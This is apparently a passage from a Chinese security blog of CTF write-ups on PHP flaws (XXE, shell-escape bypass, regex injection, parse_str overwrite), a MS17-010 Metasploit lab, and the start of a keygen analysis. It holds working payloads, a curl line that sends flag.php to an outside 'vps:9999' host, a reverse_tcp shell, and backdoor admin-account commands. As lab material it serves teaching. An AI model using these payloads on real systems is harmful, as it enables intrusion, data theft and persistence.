<pre><code class="hljs xml">?name=SimpleXMLElement&amp;param=<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/f1ag.php&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span>%26xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span>&amp;param2=2</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230727404.png" alt="image-20210320230727404"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230746924.png" alt="image-20210320230746924"></p>
<p><strong>方法二:</strong></p>
<p>使用 SplFileObject 类直接读取文件</p>
<p>payload</p>
<pre><code class="hljs sqf">?<span class="hljs-built_in">name</span>=SplFileObject&amp;<span class="hljs-built_in">param</span>=./<span class="hljs-built_in">flag</span>.php&amp;param2=r</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320231130526.png" alt="image-20210320231130526"></p>
<h2 id="4-escapeshellarg与escapeshellcmd使用不当"><a href="#4-escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="4.escapeshellarg与escapeshellcmd使用不当"></a>4.escapeshellarg与escapeshellcmd使用不当</h2><p>主体上就是一个过滤了后的mail函数执行。<br>mail函数的参数是这样的</p>
<pre><code class="hljs php"><span class="hljs-keyword">bool</span> mail (
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$to</span> ,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$subject</span> ,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> [,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_headers</span> [,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_parameters</span> ]]
)</code></pre>

<p>由于默认调用的是linux的sendmail函数，所以可以在<code>message</code>中写入恶意代码。接着由additional_parameters 指定额外参数，从而写入在指定目录写入文件。</p>
<p>但是，php的mail函数也在底层默认执行了一层<code>escapeshellcmd()</code>函数，那么显然转义了我们的恶意代码。<br>不过，本题代码还有一处经典的<code>escapeshellarg()</code>。如果<code>escapeshellarg()</code>+<code>escapeshellcmd()</code>搭配使用，将出现特殊字符逃逸的问题。<br>buu上也有一个类似的题目.这里则借用项目里的例子简单介绍下</p>
<pre><code class="hljs routeros">127.0.0.1<span class="hljs-string">&#x27; -v -d a=1</span>
<span class="hljs-string">#escapeshellarg</span>
<span class="hljs-string">&#x27;</span>127.0.0.1<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; -v -d a=1&#x27;</span>
<span class="hljs-comment">#escapeshellcmd</span>
<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;</code></pre>

<p>此时最后一步可以看出，<code>\\</code>将被解释为<code>\</code>不再起到转义的作用，而是作为换行符。因此payload变为先是<code>127.0.0.1</code>，再<code>-v -d</code>-d对应的数据为<code>a=1&#39;</code>.</p>
<p>比如CVE-2016-10033 跟CVE-2016-10045的两个payload</p>
<pre><code class="hljs awk">a( -OQueueDirectory=<span class="hljs-regexp">/tmp -X/</span>var<span class="hljs-regexp">/www/</span>html/x.php )@a.com

a<span class="hljs-string">&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span></code></pre>

<p>前者没有escapeshellcmd直接打。后者escapeshellcmd后又加了一层escapeshellarg导致字符逃逸。</p>
<p>源码如下，对其进行了注释</p>
<pre><code class="hljs php+HTML">&lt;?php
highlight_file(&#39;index.php&#39;);
function waf($a)&#123;
    foreach($a as $key &#x3D;&gt; $value)&#123;
        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;&#x2F;&#x2F;遍历所有键，不能出现flag字样
            exit(&#39;are you a hacker&#39;);
        &#125;
    &#125;
&#125;
foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;&#x2F;&#x2F;遍历所有以post，get，cookie方式提交的数据，
    if($$__R) &#123; &#x2F;&#x2F;例如$flag&#x3D;a,$$flag--&gt;$a,一个新变量
        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; 
            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); &#x2F;&#x2F;若之前有这个变量并且键和值相等，就删除这个变量
        &#125;
    &#125;

&#125;
if($_POST) &#123; waf($_POST);&#125;
if($_GET) &#123; waf($_GET); &#125;
if($_COOKIE) &#123; waf($_COOKIE);&#125;

if($_POST) extract($_POST, EXTR_SKIP);&#x2F;&#x2F;将键名变成变量名，如果传入flag，应该是设置了_GET[&#39;flag&#39;]这个变量
if($_GET) extract($_GET, EXTR_SKIP);
if(isset($_GET[&#39;flag&#39;]))&#123;&#x2F;&#x2F;必须设置以get方式传参的flag..这个可以用
    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123;
        exit(&#39;error&#39;);
    &#125;
    if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;&#x2F;&#x2F;数组或碰撞
		echo &quot;success!&quot;;
	   $url &#x3D; $_GET[&#39;url&#39;];
        $urlInfo &#x3D; parse_url($url);
        if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123;
            die( &quot;scheme error!&quot;);
        &#125;
        $url &#x3D; escapeshellarg($url);
        $url &#x3D; escapeshellcmd($url);&#x2F;&#x2F;特殊字符逃逸
        system(&quot;curl &quot;.$url);
    &#125;
&#125;
?&gt;
</code></pre>

<p>很明显的变量覆盖，之后要绕过waf。再接下来就是escapeshellsmd/arg的搭配进行命令执行了。<br>首先要解决的是，我们必须绕过preg_match的限制才能传入flag变量。因此要利用好它写好的这个功能。</p>
<p>首先这里利用了可变变量的特性。假设我们提交</p>
<pre><code class="hljs sqf">?<span class="hljs-built_in">flag</span>=test 
post:<span class="hljs-variable">_GET</span>[<span class="hljs-built_in">flag</span>]=test</code></pre>

<p>当开始遍历 <code>$_POST</code> 超全局数组的时候， <code>$__k</code> 代表 _GET[flag] ，所以 <code>$$__k</code>就是 <code>$_GET[flag]</code> ，即 test 值，此时 <code>$$__k == $__v</code> 成立，变量 <code>$_GET[flag]</code> 就被 unset 了</p>
<p>而接下来下面又有一个变量覆盖<br><code>if($_POST) extract($_POST, EXTR_SKIP);</code><br>所以直接得到<code>$_GET[flag]=test</code>绕过第一层</p>
<p>第二层只需利用0e的MD5弱类型比较<br>最后是curl的命令执行<br><code>http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x vps:9999</code><br>似乎当curl版本变高后，将不再能执行。<br><code>curl &#39;127.0.0.1&#39;\&#39;&#39;</code></p>
<h2 id="5-preg-match函数漏洞"><a href="#5-preg-match函数漏洞" class="headerlink" title="5.preg_match函数漏洞"></a>5.preg_match函数漏洞</h2><pre><code class="hljs php"><span class="hljs-comment">// index.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;
<span class="hljs-keyword">if</span>  (<span class="hljs-string">&quot;POST&quot;</span> == <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>])
&#123;
    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="hljs-variable">$password</span>))
    &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong Format&#x27;</span>;
        <span class="hljs-keyword">exit</span>;
    &#125;
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">TRUE</span>)
    &#123;
        <span class="hljs-variable">$reg</span> = <span class="hljs-string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$arr</span>))
            <span class="hljs-keyword">break</span>;
        <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;
        <span class="hljs-variable">$ps</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;punct&#x27;</span>, <span class="hljs-string">&#x27;digit&#x27;</span>, <span class="hljs-string">&#x27;upper&#x27;</span>, <span class="hljs-string">&#x27;lower&#x27;</span>);
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ps</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pt</span>)
        &#123;
            <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:<span class="hljs-subst">$pt</span>:]]+/&quot;</span>, <span class="hljs-variable">$password</span>))
            <span class="hljs-variable">$c</span> += <span class="hljs-number">1</span>;
        &#125;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == <span class="hljs-variable">$password</span>) <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong password&#x27;</span>;
        <span class="hljs-keyword">exit</span>;
    &#125;
&#125;
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>字符类的含义是</p>
<pre><code class="hljs gauss"><span class="hljs-keyword">graph</span> 空格以外的可打印字符
punct  打印字符，不包括字母数字</code></pre>

<p>主要函数里，第一个正则表示匹配到可打印字符12个以上;第二个正则表示把连续的符号、数字、大写、小写，作为一段，至少分六段;第三个正则表示输入的字符串至少含有符号、数字、大写、小写中的三种类型。</p>
<p>最后与数字进行弱类型比较。<br>payload</p>
<pre><code class="hljs apache"><span class="hljs-attribute">42</span>.<span class="hljs-number">00</span>e+<span class="hljs-number">00000</span></code></pre>


<p>第一种方法</p>
<pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/index.php?option=a</span></code></pre>

<p>第一个payload写入内容后只有一个单引号被转义的问题。而第二部分再传入一个a时就会因为<code>.*</code>匹配无数次而把<code>\</code>换掉</p>
<p>还有两种preg_replace的方法、这里提下第二种，也就是还适用于单行(非贪婪)模式的payload。之前安恒的套娃web2里出现过。</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>ph.php?option=;phpinfo();
http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>ph.php?option=<span class="hljs-variable">$0</span></code></pre>

<p>其最后的效果是下面这样的</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$option</span>=<span class="hljs-string">&#x27;$option=&#x27;</span>;phpinfo();<span class="hljs-string">&#x27;;&#x27;</span>;</code></pre>

<h2 id="6-parse-str函数缺陷"><a href="#6-parse-str函数缺陷" class="headerlink" title="6.parse_str函数缺陷"></a>6.parse_str函数缺陷</h2><p><strong>漏洞代码</strong></p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUser</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;
  <span class="hljs-keyword">global</span> <span class="hljs-variable">$config</span>, <span class="hljs-variable">$db</span>;
  <span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$db</span>)) &#123;
    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> MySQLi(
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbhost&#x27;</span>],
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbuser&#x27;</span>],
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbpass&#x27;</span>],
      <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbname&#x27;</span>]
    );
  &#125;
  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT username FROM users WHERE id = ?&quot;</span>;
  <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$db</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);
  <span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-variable">$id</span>);
  <span class="hljs-variable">$stmt</span>-&gt;bind_result(<span class="hljs-variable">$name</span>);
  <span class="hljs-variable">$stmt</span>-&gt;execute();
  <span class="hljs-variable">$stmt</span>-&gt;fetch();
  <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;
&#125;

<span class="hljs-variable">$var</span> = parse_url(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]);
parse_str(<span class="hljs-variable">$var</span>[<span class="hljs-string">&#x27;query&#x27;</span>]);
<span class="hljs-variable">$currentUser</span> = getUser(<span class="hljs-variable">$id</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$currentUser</span>).<span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span>;</code></pre>

<p><strong>漏洞解析</strong></p>
<p><strong>parse_str</strong></p>
<p>先来看看定义：</p>
<blockquote>
<p>parse_str<br><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p>
<p>定义 ：void parse_str( string $encoded_string [, array &amp;$result ] )</p>
<p>如果 encoded_string 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）</p>
</blockquote>
<p>看了定义我们也能很快感受到它的漏洞点就是变量覆盖了。</p>
<p><strong>PHP $_SERVER[‘HTTP_REFERER’]</strong></p>
<p>PHP <code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>，它是获取当前页面的url。需要注意的是，<code>$_SERVER[‘HTTP_REFERER’]</code>完全来源于浏览器。并不是所有的用户代理（浏览器）都会设置这个变量，而且有的还可以手工修改 HTTP_REFERER。因此，$_SERVER[‘HTTP_REFERER’] 是可以伪造的。<br><strong><code>$_SERVER[‘HTTP_REFERER’]</code>对 POST 表单访问也是有效的</strong><br>我们想办法提交类似 config[dbhost]=127.0.0.1 这样类型的数据，这样因此我们可以控制连接的数据库，导致网站出现错误显示。</p>
<p><strong>CTF题目</strong></p>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = “hongri”;
<span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
@parse_str(<span class="hljs-variable">$id</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>upload.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
header(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);
<span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$referer</span>)!== <span class="hljs-literal">false</span>) &#123;
    <span class="hljs-variable">$savepath</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . sha1(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&quot;/&quot;</span>;
    <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$savepath</span>)) &#123;
        <span class="hljs-variable">$oldmask</span> = umask(<span class="hljs-number">0</span>);
        mkdir(<span class="hljs-variable">$savepath</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);
        umask(<span class="hljs-variable">$oldmask</span>);
    &#125;
    <span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;
        <span class="hljs-comment">//$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span>
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;
        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;
        usleep(<span class="hljs-number">100000</span>);
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;
        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
    &#125;
   <span class="hljs-keyword">print</span> &lt;&lt;&lt;EOT
&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;
&lt;div class=&quot;form-group&quot;&gt;
&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span>&gt;Filename&lt;/label&gt;
&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt;
&lt;/div&gt;
&lt;div class=&quot;form-group&quot;&gt;
&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span>&gt;Content&lt;/label&gt;
&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt;
&lt;/div&gt;
&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt;
&lt;/form&gt;
EOT;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you can not see this page&#x27;</span>;
&#125;</code></pre>

<p><strong>第一关</strong></p>
<p>在index.php内有如下;</p>
<pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
@parse_str(<span class="hljs-variable">$id</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;</code></pre>

<p>可想而知我们需要用变量覆盖，payload为：</p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=a[0]=s878926199a</code></pre>

<p>就会出来一个链接，点击就到了upload页面。如果我们直接访问upload会报错，因为有如下代码：</p>
<pre><code class="hljs php"><span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$referer</span>)!== <span class="hljs-literal">false</span>)</code></pre>

<p>当我们是通过a标签链接过去的会自动带上refer字段。</p>
<p><strong>第二关</strong></p>
<p>uplaod主要代码：</p>
<pre><code class="hljs awk"><span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;
        <span class="hljs-regexp">//</span><span class="hljs-variable">$fp</span> = fopen(<span class="hljs-string">&quot;$savepath&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-string">&#x27;w&#x27;</span>);
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#x27;</span>;
        file_put_contents(<span class="hljs-string">&quot;$savepath&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;
        echo <span class="hljs-variable">$msg</span>;
        usleep(<span class="hljs-number">100000</span>);<span class="hljs-regexp">//</span>延迟
        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;
        file_put_contents(<span class="hljs-string">&quot;$savepath&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);
    &#125;</code></pre>

<p>可以发现会我们传入的<code>filename</code>会固定的存储在一个固定的位置，而这个位置会在输出中得到。<br>而文件的内容先是flag然后延迟一下马上替换为了 Too slow! 。其实输入的content并没任何作用。<br>思路：我们一直上传同一个文件名，然后使用python或者pb不断的访问这个文件。如果够快就不会把文本内容替换为 Too slow! 这样我们就可以访问到flag</p>
<h1 id="MS17-010漏洞利用演示"><a href="#MS17-010漏洞利用演示" class="headerlink" title="MS17-010漏洞利用演示"></a>MS17-010漏洞利用演示</h1><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
<p>Kali IP 192.168.164.143</p>
<p>win7 IP 192.168.164.135 </p>
<p> 使用ping测试即可</p>
<p>使用msf前需要开启postgresql服务 </p>
<p>开启服务：</p>
<pre><code class="hljs crmsh">service postgresql <span class="hljs-literal">start</span></code></pre>

<p>查看服务状态：</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">service postgresql status</span></code></pre>

<p>开到绿色字体的active即为开启了</p>
<p>初始化数据库：</p>
<pre><code class="hljs csharp">msfdb <span class="hljs-keyword">init</span></code></pre>

<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410130055679.png" alt="image-20210410130055679" style="zoom:50%;"> </p>
<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><p><strong>(1).首先判断目标主机是否打开445端口</strong></p>
<p>使用nmap+ip 扫描</p>
<img src="https://i.loli.net/2020/11/30/OPuivdSaVlTIMsm.png" alt="4.png" style="zoom:50%;"> 

<p><strong>(2) .确认目标主机打开445端口后直接使用msf进行攻击</strong></p>
<p>输入<code>msfconsole</code>　启动msf</p>
<p>输入search　MS17-010</p>
<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
<p>运行</p>
<pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre>

<p>输入 show options  查看需要配置哪些信息</p>
<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
<p>RPORT 为目标端口号(445)</p>
<p>LHOST 为监听主机IP(10.1.1.1)</p>
<img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png" style="zoom:50%;"> 



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410130809305.png" alt="image-20210410130809305"></p>
<p><strong>(3). 配置成功后设置tcp连接</strong></p>
<p>输入命令</p>
<pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre>



<p><strong>(4).开始运行</strong></p>
<p>输入 exploit/run </p>
<p>成功获取shell</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210410163228489.png" alt="image-20210410163228489" style="zoom:50%;">

<p>查看ip地址验证是否为目标主机。</p>
<p><strong>(5)设立后门，在目标主机中创建一个用户</strong></p>
<p>创建一个用户</p>
<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre>

<p>Username:test </p>
<p>password:abc123.com</p>
<p>将该用户加入管理员组，使其拥有管理员权限</p>
<pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre>

<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p>
<p>目标主机上用户创建成功</p>
<img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png" style="zoom: 50%;">

<p>  <strong>实验结束</strong></p>
<h1 id="TraceMe-exe注册机"><a href="#TraceMe-exe注册机" class="headerlink" title="TraceMe.exe注册机"></a>TraceMe.exe注册机</h1><p>打开程序，随便试一试</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514154316260.png" alt="image-20210514154316260"></p>
<p>通过OD打开该程序，它会自动定位到模块入口点0x004013A0位置，也就是验证函数的内容</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155349139.png" alt="image-20210514155349139" style="zoom:67%;">

<p>数据表中405030的数据，程序中需要用到</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155944624.png" alt="image-20210514155944624"></p>
<p>汇编代码的如下</p>
<pre><code class="hljs vb"><span class="hljs-number">00401340</span>  /$  <span class="hljs-number">55</span>            push ebp
<span class="hljs-number">00401341</span>  |.  <span class="hljs-number">8</span>B6C24 <span class="hljs-number">0</span>C     mov ebp,dword ptr ss:[esp+<span class="hljs-number">0</span>xC]          ;ebp = 用户名
<span class="hljs-number">00401345</span>  |.  <span class="hljs-number">56</span>            push esi                                 ;  TraceMe.<span class="hljs-number">0040504</span>F
<span class="hljs-number">00401346</span>  |.  <span class="hljs-number">57</span>            push edi
<span class="hljs-number">00401347</span>  |.  <span class="hljs-number">8</span>B7C24 <span class="hljs-number">18</span>     mov edi,dword ptr ss:[esp+<span class="hljs-number">0</span>x18]         ;edi = 用户名的长度
<span class="hljs-number">0040134</span>B  |.  B9 <span class="hljs-number">03000000</span>   mov ecx,<span class="hljs-number">0</span>x3 ;ecx = 从用户名的第四个字符开始计算
<span class="hljs-number">00401350</span>  |.  <span class="hljs-number">33</span>F6          <span class="hljs-built_in">xor</span> esi,esi     ;esi = <span class="hljs-number">0</span> = 计算出的注册码                             ;  TraceMe.<span class="hljs-number">0040504</span>F
<span class="hljs-number">00401352</span>  |.  <span class="hljs-number">33</span>C0          <span class="hljs-built_in">xor</span> eax,eax     ;eax = <span class="hljs-number">0</span>,用于计数，读取数据表的第eax个字节
<span class="hljs-number">00401354</span>  |.  <span class="hljs-number">3</span>BF9          cmp edi,ecx     ;<span class="hljs-keyword">if</span>(edi &gt; ecx)
00401356  |.  7E 21         jle short   ;&#123; TraceMe.00401379
<span class="hljs-number">00401358</span>  |.  <span class="hljs-number">53</span>            push ebx
<span class="hljs-number">00401359</span>  |&gt;  <span class="hljs-number">83</span>F8 <span class="hljs-number">07</span>       /cmp eax,<span class="hljs-number">0</span>x7    ; <span class="hljs-keyword">if</span>(eax &gt; <span class="hljs-number">7</span>)
